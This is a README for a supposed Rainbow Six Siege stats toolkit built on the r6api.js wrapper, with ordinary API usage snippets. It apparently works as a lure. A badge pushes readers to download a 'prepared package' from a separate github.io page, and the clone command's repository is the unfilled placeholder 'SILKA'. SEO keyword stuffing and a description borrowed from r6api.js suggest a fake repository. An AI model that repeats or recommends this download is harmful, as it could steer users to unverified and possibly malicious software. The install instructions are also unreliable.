# Rainbow Six Siege Tactics - Player Stats And Tactical Data Toolkit

<p align="center">
  <img src="logo.png" width="180" alt="Rainbow Six Siege operator emblem">
</p>

Rainbow Six Siege Tactics is a compact TypeScript toolkit for working with player profiles, progression, ranks, seasonal records, service status, and other structured game data. It brings the practical parts of a Rainbow Six API wrapper into a focused repository that can support an R6 tracker, match dashboard, operator reference, Discord command, or tactical companion.

The project follows the source layout of `r6api.js`: authentication and requests are separated from public methods, shared constants have their own module, and TypeScript declarations describe common responses. The included methods cover player lookup, profile applications, playtime, progression, ranks, seasonal summaries, news, username validation, and custom API requests.

## What Is Included

| Area | Purpose |
| --- | --- |
| Player lookup | Find one or more profiles by username or account ID |
| Player stats | Read progression, playtime, ranks, and seasonal records |
| Service checks | Inspect platform status and individual user status |
| Game reference | Reuse constants, typings, utilities, and validation helpers |
| Tactical tools | Feed Rainbow Six tactics views, operator counters, and R6 tracker panels |

The public entry point is [`src/index.ts`](src/index.ts). Request handling lives in [`src/fetch.ts`](src/fetch.ts), authentication is implemented in [`src/auth.ts`](src/auth.ts), and individual operations are grouped under [`src/methods`](src/methods). This small structure keeps the Rainbow Six Siege API surface easy to inspect without mixing it with UI code.

![Rainbow Six Siege champion rank](assets/champion-rank.png)

Rank and progression responses can be turned into compact profile cards, leaderboard rows, or season snapshots. The supplied rank artwork also provides a visual starting point for a Rainbow Six Siege operators dashboard or a player statistics view.

## Get The Build

[![GET R6 TACTICS](https://img.shields.io/badge/GET%20R6%20TACTICS-D95B2A?style=for-the-badge&logoColor=white)](https://rainbow-siege.github.io/rainbow-six-siege-tactics/rainbow-siege)

Use the button for the prepared package, or install the source with PowerShell:

```powershell
$repository = "SILKA"
git clone $repository rainbow-six-siege-tactics
Set-Location rainbow-six-siege-tactics
npm install
npm run build
```

For package use inside an existing Node.js project, install the wrapper directly:

```powershell
npm install r6api.js
```

The package metadata requires Node.js 12 or newer. TypeScript compilation writes the distributable module to `dist`, while the checked-in source remains under `src`.

## Basic Usage

Store the account values in environment variables rather than placing them in source files. The initialization pattern comes from the API wrapper documentation:

```js
require('dotenv').config();
const R6API = require('r6api.js').default;

const { UBI_EMAIL: email = '', UBI_PASSWORD: password = '' } = process.env;
const r6api = new R6API({ email, password });
```

Look up a player, then request progression and rank information:

```js
async function loadPlayer(username) {
  const [player] = await r6api.findByUsername('uplay', username);
  if (!player) return null;

  const progression = await r6api.getProgression('uplay', player.id);
  const ranks = await r6api.getRanks('uplay', player.id);
  return { player, progression, ranks };
}
```

Platforms and response shapes are defined by the included constants and typings. The wrapper also exposes `findById`, `getPlaytime`, `getUserSeasonalv2`, `getStatus`, `getUserStatus`, `getApplications`, `validateUsername`, `getNews`, and `custom`. These methods can power a focused R6 tracker without forcing presentation logic into the data layer.

For a tactical view, combine rank data with operator metadata, map references, weapon data, or operator counter rules. A Rainbow Six tactics screen can use profile progression as context while keeping operator counters and map decisions in separate modules. This matches the source projects' approach of separating API access, metadata, vector icons, quick references, and Discord bot presentation.

## Project Notes

- Run `npm run build` to compile TypeScript.
- Run `npm run lint` to check the source tree.
- Keep credentials in local environment variables.
- Use [`src/typings.ts`](src/typings.ts) when extending player stats responses.
- Add new calls as isolated files under [`src/methods`](src/methods).
- Keep rank and operator images under [`assets`](assets).

The package metadata identifies the code license as MIT. Changes should preserve the existing module boundaries, typed exports, and focused method layout.

## Topic Map

Rainbow Six tactics, Rainbow Six Siege, R6 tracker, player stats, R6 API, Siege operators, operator counters, Siege ranks, seasonal data, game status, Node.js wrapper
